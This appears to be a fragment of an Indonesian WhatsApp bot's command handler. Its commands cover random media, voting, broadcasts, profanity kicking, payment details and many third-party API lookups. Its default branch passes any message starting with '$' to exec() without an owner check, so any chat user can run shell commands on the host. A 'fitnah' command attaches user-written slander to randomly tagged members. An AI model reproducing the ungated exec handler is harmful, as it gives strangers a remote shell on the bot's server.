//=================================================
case 'cecan': {
if (isBan) return m.reply('*Lu Di Ban Owner*')
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(`cecan`)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, {image: { url: result }, caption: 'SUKSES'},{quoted : hw})
}
break
//=================================================
case 'quotesanime':
if (isBan) return m.reply('*Lu Di Ban Owner*')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${apikey}`)
reply(`_${data.result.quote}_\n\n*― ${data.result.character}*\n*― ${data.result.anime} ${data.result.episode}*`)
break
//=================================================
case 'faktaunik':
case 'katabijak':
case 'pantun':
case 'bucin':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
reply(data.result)
break
//=================================================
case 'randomnama':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/nama?apikey=${apikey}`)
reply(data.result)
break
//=================================================
// Entertainment
case 'stalktiktok':
if (isBan) return m.reply('*Lu Di Ban Owner*')
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
haikal.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
break
//=================================================
case 'jadianime': case 'toanime':
if (!isCreator) return m.reply(`*khusus Premium*`)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
var media = await haikal.downloadAndSaveMediaMessage(quoted)
let anim = await UploadFileUgu(media)
var proses = `https://api.lolhuman.xyz/api/imagetoanime?apikey=${apikey}&img=${util.format(anim.url)}`
haikal.sendMessage(from, {image: {url: proses}, caption: 'Done!'}, {quoted : hw})
break
//================================================= 
case 'fitnah': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!text) throw `Contoh : ${prefix + command} ZENN MODS WA`
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let menst = [orang, jodoh]
haikal.sendMessage(from, {text:`${text}
@${orang.split('@')[0]}  @${jodoh.split('@')[0]}`}, {mentions: menst})
}
break
//=================================================
case "welcome":
{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break
//=================================================
case 'vote': {
if (!m.isGroup) throw mess.group
if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
vote[m.chat] = [q, [], []]
await sleep(1000)
upvote = vote[m.chat][1]
devote = vote[m.chat][2]
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
haikal.sendMessage(from, {text:teks_vote},{quoted : hw})
}
break
//=================================================
case 'upvote': {
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][1].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
haikal.sendMessage(from, {text:teks_vote},{quoted : hw})
}
 break
 //=================================================
case 'devote': {
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][2].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
haikal.sendMessage(from, {text:teks_vote},{quoted : hw})
}
break
//=================================================
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${haikal.user.id}
`
haikal.sendTextWithMentions(m.chat, teks_vote, m)
break
//=================================================
case 'deletevote': case'delvote': case 'hapusvote': {
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
delete vote[m.chat]
m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
}
break
//=================================================
case 'play': case 'ytplay': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
haikal.sendMessage(m.chat,  {
image: { url: anu.thumbnail },
caption: `
辛 Title : ${anu.title}
辛 Ext : Search
辛 Id : ${anu.videoId}
⏳ Duration : ${anu.timestamp}
辛 Viewers : ${anu.views}
辛 Upload At : ${anu.ago}
辛 Author : ${anu.author.name}
辛 Channel : ${anu.author.url}
辛 Description : ${anu.description}
辛 Url : ${anu.url}

辛 ytmp4 ${anu.url}
辛 ytvn ${anu.url}`}, {quoted:m})
}
break
//=================================================
case 'ytsearch':
if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
axios
.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${command}`)
.then(({ data }) => {
var text = ''
for (var x of data.result) {
text += `Title : ${x.title}\n`
text += `Views : ${x.views}\n`
text += `Published : ${x.published}\n`
text += `Thumbnail : ${x.thumbnail}\n`
text += `Unduh Mengunduh Silahkan Ketik Ytmp4 https://www.youtube.com/watch?v=${x.videoId} Atau Ytvn https://www.youtube.com/watch?v=${x.videoId}\n\n`
}
reply(text)
})
.catch(console.error)
break
//=================================================
case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await haikal.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
haikal.sendMessage(i, { image: fs.readFileSync ('./baseikal/image/hw.jpg'),  caption: `「 Broadcast Bot 」\n\n${text}` }, {quoted : m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'antilink': {
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
//=================================================
case "antitoxic":
{
if (!isCreator) return m.reply(`*khusus Premium*`)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(from)
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(from)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break
//=================================================
case 'larangan': case 'peraturan': {
 if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `Haii 👋 Aku Shekai Bot ʜᴡ ᴍᴏᴅꜱ ᴡᴀ
Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!

Larangan !!!
fuck
ajg
anjing
ngentod
bangsat
bgst` , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
//=================================================//
case 'fuck': case 'ajg': case 'ngentod': case 'bangsat': case'anjing': case'babi': {
if (!welcmm) return
if (!m.isGroup) return m.reply('Jangan Toxic Coy Kalau Di group Dah Ku Kick Anjay')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
kicee = m.sender
await haikal.groupParticipantsUpdate(from, [kicee], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
haikal.sendMessage(from, {text:`「 Detect Toxic 」\n\n@${kicee.split("@")[0]} Telah dikick karena Telah Toxic di group ini`, contextInfo:{mentionedJid:[kicee]}}, {quoted:m})
}
break
//=================================================//
case 'pdana': {
 haikal.sendMessage(from, { image: dana,  caption: `DANA : 085788734756` }, {quoted:m})
}
break
case 'pgopay': {
 haikal.sendMessage(from, { image: gopay,  caption: `GOPAY : 085714170944` }, {quoted:m})
}
break
case 'pbca': {
 haikal.sendMessage(from, { image: rekening,  caption: `Rek BCA : 2832657396` }, {quoted:m})
}
break
//=================================================
case 'bayar':{
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Pembayaran Silahkan Ketik Di Bawah Yah : 

° pdana
° pgopay
° pbca

Terima Kasih`)
}
break
//=================================================
case 'ytplay':
if (!isCreator) return m.reply(`*khusus Premium*`)
if (args.length == 0) return await reply(`Example: ${prefix + command} melukis senja`)
axios
.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${command}`)
.then(({ data }) => {
axios.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=https://www.youtube.com/watch?v=${data.result[0].videoId}`).then(({ data }) => {
var caption = `❖ Title    : *${data.result.title}*\n`
caption += `❖ Size     : *${data.result.size}*`
haikal.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
haikal.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
})
})
})
.catch(console.error)
break
//=================================================
case 'kbbi':
if (args.length == 0) return reply(`Example: ${prefix + command} kursi`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/kbbi?apikey=${apikey}&query=${command}`)
var texshajt = `\`\`\`Kata : ${data.result[0].nama}\`\`\`\n`
texshajt += `\`\`\`Kata Dasar : ${data.result[0].kata_dasar}\`\`\`\n`
texshajt += `\`\`\`Pelafalan : ${data.result[0].pelafalan}\`\`\`\n`
texshajt += `\`\`\`Bentuk Tidak Baku : ${data.result[0].bentuk_tidak_baku}\`\`\`\n\n`
for (var x of data.result) {
texshajt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
texshajt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
texshajt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
texshajt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
texshajt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
}
reply(texshajt)
break
//=================================================
case 'brainly':
if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/brainly?apikey=${apikey}&query=${command}`)
var texsgat = 'Beberapa Pembahasan Dari Brainly :\n\n'
for (var x of data.result) {
texsgat += `==============================\n`
texsgat += `\`\`\`Pertanyaan :\`\`\`\n${x.question.content}\n\n`
texsgat += `\`\`\`Jawaban :\`\`\`\n${x.answer[0].content}\n`
texsgat += `==============================\n\n`
}
reply(texsgat)
break
//=================================================
case 'roboguru':
if (args.length == 0) return reply(`Example: ${prefix + command} siapakah sukarno`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/roboguru?apikey=${apikey}&query=${command}&grade=sma&subject=sejarah`).catch((err) => console.error(err?.response?.data))
var tedaysxt = 'Beberapa Pembahasan Dari Roboguru :\n\n'
for (var x of data.result) {
tedaysxt += `==============================\n`
tedaysxt += `\`\`\`Pertanyaan :\`\`\`\n${x.question}\n\n`
tedaysxt += `\`\`\`Jawaban :\`\`\`\n${x.answer}\n`
tedaysxt += `==============================\n\n`
}
reply(tedaysxt)
break
//=================================================
case 'chord':
if (args.length == 0) return reply(`Example: ${prefix + command} Melukis senja`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/chord?apikey=${apikey}&query=${command}`)
var texhswishstgshsvahz = `Title : ${data.result.title}\n`
texhswishstgshsvahz += `Chord : \n${data.result.chord}`
reply(texhswishstgshsvahz)
break
//=================================================
case 'heroml':
if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
var { data } = await axios.get(`https://api.lolhuman.xyz/api/heroml/${text}?apikey=${apikey}`)
var caption = `Name : ${data.result.hero_name}\n`
caption += `Entrance Quotes : ${data.result.ent_quotes}\n`
caption += `Role : ${data.result.detail.role}\n`
caption += `Specialty : ${data.result.detail.specialty}\n`
caption += `Laning : ${data.result.detail.laning_recommendation}\n`
caption += `Release : ${data.result.detail.release_date}\n`
caption += `Movement speed : ${data.result.attr.movement_speed}\n`
caption += `Physical attack : ${data.result.attr.physical_attack}\n`
caption += `Magic power : ${data.result.attr.magic_power}\n`
caption += `Physical defense : ${data.result.attr.physical_defense}\n`
caption += `Magic defense : ${data.result.attr.magic_defense}\n`
caption += `Critical rate : ${data.result.attr.basic_atk_crit_rate}\n`
caption += `Hp : ${data.result.attr.hp}\n`
caption += `Mana : ${data.result.attr.mana}\n`
caption += `Mana regen : ${data.result.attr.mana_regen}\n`
haikal.sendMessage(from, { image: { url: data.result.icon }, caption })
break
//=================================================
case 'jadwaltv':
if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=${apikey}`)
var txtayaj = `Jadwal TV ${args[0].toUpperCase()}\n`
for (var x in data.result) {
txtayaj += `${x} - ${data.result[x]}\n`
}
reply(txtayaj)
break
//=================================================
case 'jadwaltvnow':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
var txtayajas = `Jadwal TV Now :\n`
for (var x in data.result) {
txtayajas += `${x.toUpperCase()}${data.result[x]}\n\n`
}
reply(txtayajas)
break
//=================================================
case 'infogempa':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=${apikey}`)
var caption = `Lokasi : ${data.result.lokasi}\n`
caption += `Waktu : ${data.result.waktu}\n`
caption += `Potensi : ${data.result.potensi}\n`
caption += `Magnitude : ${data.result.magnitude}\n`
caption += `Kedalaman : ${data.result.kedalaman}\n`
caption += `Koordinat : ${data.result.koordinat}`
haikal.sendMessage(from, { image: { url: data.result.map }, caption })
break
//=================================================
case 'lirik':
if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=${apikey}&query=${command}`)
reply(data.result)
break
//=================================================
case 'kodepos':
if (args.length == 0) return reply(`Example: ${prefix + command} Slemanan or ${prefix + command} 66154`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/kodepos?apikey=${apikey}&query=${command}`)
var txtayajasa = `Provinsi : ${data.result[0].province}\n`
txtayajasa += `Kabupaten : ${data.result[0].city}\n`
txtayajasa += `Kecamatan : ${data.result[0].subdistrict}\n`
txtayajasa += `Kelurahan : ${data.result[0].urban}\n`
txtayajasa += `Kode Pos : ${data.result[0].postalcode}`
reply(txtayajasa)
break
//=================================================
case 'jadwalbola':
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwalbola?apikey=${apikey}`)
var txtayajasass = 'Jadwal Bola :\n'
for (var x of data.result) {
txtayajasass += `Hari : ${x.hari}\n`
txtayajasass += `Jam : ${x.jam}\n`
txtayajasass += `Event : ${x.event}\n`
txtayajasass += `Match : ${x.match}\n`
txtayajasass += `TV : ${x.tv}\n\n`
}
reply(txtayajasass)
break
//=================================================
case 'playstore':
if (args.length == 0) return reply(`Example: ${prefix + command} telegram`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/playstore?apikey=${apikey}&query=${command}`)
var txtayajasassa = 'Play Store Search : \n'
for (var x of data.result) {
txtayajasassa += `Name : ${x.title}\n`
txtayajasassa += `ID : ${x.appId}\n`
txtayajasassa += `Developer : ${x.developer}\n`
txtayajasassa += `Link : ${x.url}\n`
txtayajasassa += `Price : ${x.priceText}\n`
txtayajasassa += `Price : ${x.price}\n\n`
}
reply(txtayajasassa)
break
//=================================================
case 'shopee':
if (args.length == 0) return reply(`Example: ${prefix + command} tas gendong`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/shopee?apikey=${apikey}&query=${command}`)
var textaua = 'Shopee Search : \n'
for (var x of data.result) {
textaua += `Name : ${x.name}\n`
textaua += `Terjual : ${x.sold}\n`
textaua += `Stock : ${x.stock}\n`
textaua += `Lokasi : ${x.shop_loc}\n`
textaua += `Link : ${x.link_produk}\n\n`
}
reply(textaua)
break
//=================================================
case 'jodoh':
if (args.length == 0) return reply(`Example: ${prefix + command} Tahu & Bacem`)
axios.get(`https://api.lolhuman.xyz/api/jodoh/${full_args.split('&')[0]}/${full_args.split('&')[1]}?apikey=${apikey}`).then(({ data }) => {
var textauaaa = `Positif : ${data.result.positif}\n`
textauaaa += `Negative : ${data.result.negatif}\n`
textauaaa += `Deskripsi : ${data.result.deskripsi}`
reply(textauaaa)
})
break
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply(`*khusus Premium*`)
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`*khusus Premium*`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (from.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
